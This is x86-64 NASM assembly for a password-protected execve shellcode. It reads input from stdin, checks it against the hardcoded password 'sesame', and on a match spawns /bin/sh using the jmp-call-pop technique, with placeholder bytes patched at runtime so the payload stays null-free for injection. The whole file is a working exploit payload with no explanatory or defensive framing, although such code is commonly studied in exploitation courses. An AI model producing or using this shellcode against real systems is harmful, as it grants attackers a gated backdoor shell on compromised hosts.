section .text
global _start
_start:
	xor rax, rax
	times 4 push rax
	pop rdi
	pop rsi
	pop rdx
	pop rbx

	;  ssize_t read(int fd, void *buf, size_t count);
	;mov al, byte 0x0
	;mov dil, byte 0x0
        push rsp
        pop rsi
        mov dl, 0x10
        syscall


	jmp over
	passwd: db "sesame"
over:
	xor rcx, rcx
	mov cl, 0x6
	cld
compare:
	lea rdi, [rel passwd]
	mov rdi, [rdi+rbx]
	lea rsi, [rsp]
	mov rsi, [rsi+rbx]
	cmp dil, sil
	jnz exits
	inc rbx
	loop compare
	jmp dontexit

exits:
	xor rax, rax
	mov al, 60
	xor rdi, rdi
	syscall

dontexit:
	jmp getstr
runtime:
	pop rdi
	xor rax, rax
	mov [rdi+7], byte ah
	mov [rdi+8], rdi
	mov [rdi+16], rax
	lea rsi, [rdi+8]
	lea rdx, [rdi+16]
	add al, 59
	syscall
getstr:
	call runtime
	prog: 	db	"/bin/shABBBBBBBBCCCCCCCC"

